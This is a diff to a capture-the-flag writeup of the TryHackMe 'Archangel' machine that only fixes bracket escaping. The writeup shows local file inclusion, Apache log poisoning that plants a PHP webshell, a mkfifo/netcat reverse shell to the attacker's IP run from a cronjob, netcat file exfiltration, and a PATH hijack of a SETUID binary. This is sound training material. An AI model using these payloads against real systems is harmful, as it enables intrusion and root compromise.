@@ -129,7 +129,7 @@ Most notably, we can see the domain of the email as mafialive.thm. Adding this d
 The website seems to be a simple HTTP server. There may be some interesting files / directories that can be revealed using a gobuster scan.
 
 {% highlight bash %}
-┌─[0xd4y@Writeup\]─[~/business/tryhackme/easy/linux/archangel/lfi\]
+┌─[0xd4y@Writeup]─[~/business/tryhackme/easy/linux/archangel/lfi]
 
 └──╼ $gobuster dir -u http://mafialive.thm -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php
 
@@ -141,19 +141,19 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ===============================================================
 
-[+\] Url:            http://mafialive.thm
+[+] Url:            http://mafialive.thm
 
-[+\] Threads:        10
+[+] Threads:        10
 
-[+\] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 
-[+\] Status codes:   200,204,301,302,307,401,403
+[+] Status codes:   200,204,301,302,307,401,403
 
-[+\] User Agent:     gobuster/3.0.1
+[+] User Agent:     gobuster/3.0.1
 
-[+\] Extensions:     php
+[+] Extensions:     php
 
-[+\] Timeout:        10s
+[+] Timeout:        10s
 
 ===============================================================
 
@@ -195,7 +195,7 @@ Output:
 Expectedly, the output of this URL is a base64 string relating to the source code of the mrrobot.php file. Decoding this string we see the following:
 
 {% highlight bash %}
-┌─[0xd4y@Writeup\]─[~/business/tryhackme/easy/linux/archangel\]  
+┌─[0xd4y@Writeup]─[~/business/tryhackme/easy/linux/archangel]  
 └──╼ $echo -n "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" |base64 -d<?php echo 'Control is an illusion'; ?>
 {% endhighlight %}
 
@@ -212,7 +212,7 @@ Output:
 The webpage provides an error message that says “Sorry, Thats not allowed”. Judging by this error message and the unsuccessful attempt at including the targeted file, we can conclude that there is a filter inside the test.php script that is detecting attempts at including local files. Implementing the same methodology that we used to read the source code for the mrrobot.php file, we can view the source code of the test.php file.
 
 {% highlight bash %}
-┌─[✗\]─[0xd4y@Writeup\]─[~/business/tryhackme/easy/linux/archangel\]  
+┌─[✗]─[0xd4y@Writeup]─[~/business/tryhackme/easy/linux/archangel]  
 └──╼ $echo -n "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygk  
 c3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyK  
 CRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYX  
@@ -226,7 +226,7 @@ After decoding the base64 data, we are met with the contents of the test.php fil
 <html>  
   
 <head>   <title>INCLUDE</title>   <h1>Test Page. Not to be Deployed</h1>   </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"\><button id="secret"\>Here is a button</button></a><br>       <?php            //FLAG: thm{explo1t1ng_lf1}           function containsStr($str, $substr) {               return strpos($str, $substr) !== false;  
-           }            if(isset($_GET["view"\])){            if(!containsStr($_GET['view'\], '../..') && containsStr($_GET['view'\], '/var/www/html/development_testing')) {                   include $_GET['view'\];  
+           }            if(isset($_GET["view"])){            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {                   include $_GET['view'];  
            }else{                echo 'Sorry, Thats not allowed';  
            }  
         }       ?>   </div>  
@@ -251,10 +251,10 @@ Although we can include sensitive files on the vulnerable system, it is necessar
 
 #### Log Poisoning
 
-This can be done by log poisoning[[1\]](#ftnt1). Looking back at the results of the [nmap scan](#h.5u2vk3e7kgnj), we can see that the http service is running the Apache version. It follows that there is most likely an apache log file at /var/log/apache2/access.log which can be leveraged to gain RCE. After verifying the existence of this file, I used netcat to poison the log file.
+This can be done by log poisoning[[1]](#ftnt1). Looking back at the results of the [nmap scan](#h.5u2vk3e7kgnj), we can see that the http service is running the Apache version. It follows that there is most likely an apache log file at /var/log/apache2/access.log which can be leveraged to gain RCE. After verifying the existence of this file, I used netcat to poison the log file.
 
 {% highlight bash %}
-┌─[0xd4y@Writeup\]─[~/business/tryhackme/easy/linux/archangel\]        
+┌─[0xd4y@Writeup]─[~/business/tryhackme/easy/linux/archangel]        
 └──╼ $nc mafialive.thm 80  
 GET /<?php phpinfo(); ?>                                     HTTP/1.1 400 Bad Request  
 Date: Sat, 01 May 2021 02:27:27 GMT  
@@ -272,9 +272,9 @@ We can confirm if this attempt was successful by including this log file and vie
 Seeing as the log file outputs the PHP info, we can conclude that the malicious GET request succeeded, and the PHP code was executed on the web server. Therefore, we can send another GET request to create a PHP webshell:
 
 {% highlight bash %}
-┌─[✗\]─[0xd4y@Writeup\]─[~/business/tryhackme/easy/linux/archangel\]  
+┌─[✗]─[0xd4y@Writeup]─[~/business/tryhackme/easy/linux/archangel]  
 └──╼ $nc mafialive.thm 80  
-GET /<?php system($_GET['cmd'\]);?>  
+GET /<?php system($_GET['cmd']);?>  
 HTTP/1.1 400 Bad Request  
 Date: Sat, 01 May 2021 02:34:25 GMT  
 Server: Apache/2.4.29 (Ubuntu)  
@@ -302,7 +302,7 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 
 Note that a url-encoded netcat reverse shell was used  
 
-The revshell[[2\]](#ftnt2) tool was used to create the reverse shell payload, and we are able to get a shell as the www-data user.
+The revshell[[2]](#ftnt2) tool was used to create the reverse shell payload, and we are able to get a shell as the www-data user.
 
 ![](/reports/Archangel/image4.png)
 
@@ -369,8 +369,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.29.238 9002 >/tmp/f
 Eventually, the cronjob runs and we get a shell as the archangel user.
 
 {% highlight bash %}
-┌─[0xd4y@Writeup\]─[~/business/tryhackme/easy/linux/archangel\]└──╼ $nc -lvnp 9002listening on [any\] 9002 ...  
-connect to [10.2.29.238\] from (UNKNOWN) [10.10.72.16\] 47742/bin/sh: 0: can't access tty; job control turned off  
+┌─[0xd4y@Writeup]─[~/business/tryhackme/easy/linux/archangel]└──╼ $nc -lvnp 9002listening on [any] 9002 ...  
+connect to [10.2.29.238] from (UNKNOWN) [10.10.72.16] 47742/bin/sh: 0: can't access tty; job control turned off  
 $ whoami  
 archangel
 {% endhighlight %}
@@ -387,15 +387,15 @@ Within this directory lies a “backup” file with SETUID root permissions. Upo
 archangel@ubuntu:~/secret$ ./backup  
 cp: cannot stat '/home/user/archangel/myfiles/\*': No such file or directory
 
-We can download this file using netcat to further analyze this binary on our attack box with Ghidra[[3\]](#ftnt3).
+We can download this file using netcat to further analyze this binary on our attack box with Ghidra[[3]](#ftnt3).
 
 {% highlight bash %}
 archangel@ubuntu:~/secret$ nc -w3 10.2.29.238 9001 < backup
   
-┌─[0xd4y@Writeup\]─[~/business/tryhackme/easy/linux/archangel\]└──╼ $nc -lvnp 9001 > backup  
-listening on [any\] 9001 ...  
-connect to [10.2.29.238\] from (UNKNOWN) [10.10.72.16\] 42682  
-┌─[0xd4y@Writeup\]─[~/business/tryhackme/easy/linux/archangel\]  
+┌─[0xd4y@Writeup]─[~/business/tryhackme/easy/linux/archangel]└──╼ $nc -lvnp 9001 > backup  
+listening on [any] 9001 ...  
+connect to [10.2.29.238] from (UNKNOWN) [10.10.72.16] 42682  
+┌─[0xd4y@Writeup]─[~/business/tryhackme/easy/linux/archangel]  
 └──╼ $ls  
 backup  lfi  nmap  notes.txt
 {% endhighlight %}
@@ -416,7 +416,7 @@ As can be seen, the binary is calling the cp command without using a full path.
 
 #### Command Injection
 
-Thus, we can exploit this vulnerability by creating a file called cp and modifying our PATH environment variable to prioritize the location of this malicious file[[4\]](#ftnt4):
+Thus, we can exploit this vulnerability by creating a file called cp and modifying our PATH environment variable to prioritize the location of this malicious file[[4]](#ftnt4):
 
 {% highlight bash %}
 archangel@ubuntu:~/secret$ cat cp  
@@ -459,10 +459,10 @@ It is highly encouraged that the system be patched as soon as possible with the 
 
 * * *
 
-[[1\]](#ftnt_ref1) [https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://www.google.com/url?q=https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1&sa=D&source=editors&ust=1653795832279006&usg=AOvVaw0vYqPLqqpfLH1no_AIDnyO) 
+[[1]](#ftnt_ref1) [https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://www.google.com/url?q=https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1&sa=D&source=editors&ust=1653795832279006&usg=AOvVaw0vYqPLqqpfLH1no_AIDnyO) 
 
-[[2\]](#ftnt_ref2) [https://github.com/0xd4y/RevShell](https://www.google.com/url?q=https://github.com/0xd4y/RevShell&sa=D&source=editors&ust=1653795832279311&usg=AOvVaw1Nq-uwG2S7SbKUK87iQimZ) 
+[[2]](#ftnt_ref2) [https://github.com/0xd4y/RevShell](https://www.google.com/url?q=https://github.com/0xd4y/RevShell&sa=D&source=editors&ust=1653795832279311&usg=AOvVaw1Nq-uwG2S7SbKUK87iQimZ) 
 
-[[3\]](#ftnt_ref3) [https://github.com/NationalSecurityAgency/ghidra](https://www.google.com/url?q=https://github.com/NationalSecurityAgency/ghidra&sa=D&source=editors&ust=1653795832279536&usg=AOvVaw0poo_jDK2AMc-8bKRwapo3) 
+[[3]](#ftnt_ref3) [https://github.com/NationalSecurityAgency/ghidra](https://www.google.com/url?q=https://github.com/NationalSecurityAgency/ghidra&sa=D&source=editors&ust=1653795832279536&usg=AOvVaw0poo_jDK2AMc-8bKRwapo3) 
 
-[[4\]](#ftnt_ref4) [https://owasp.org/www-community/attacks/Command_Injection](https://www.google.com/url?q=https://owasp.org/www-community/attacks/Command_Injection&sa=D&source=editors&ust=1653795832279759&usg=AOvVaw1S6mvU5d9Uujc94ekfUZTm)
+[[4]](#ftnt_ref4) [https://owasp.org/www-community/attacks/Command_Injection](https://www.google.com/url?q=https://owasp.org/www-community/attacks/Command_Injection&sa=D&source=editors&ust=1653795832279759&usg=AOvVaw1S6mvU5d9Uujc94ekfUZTm)
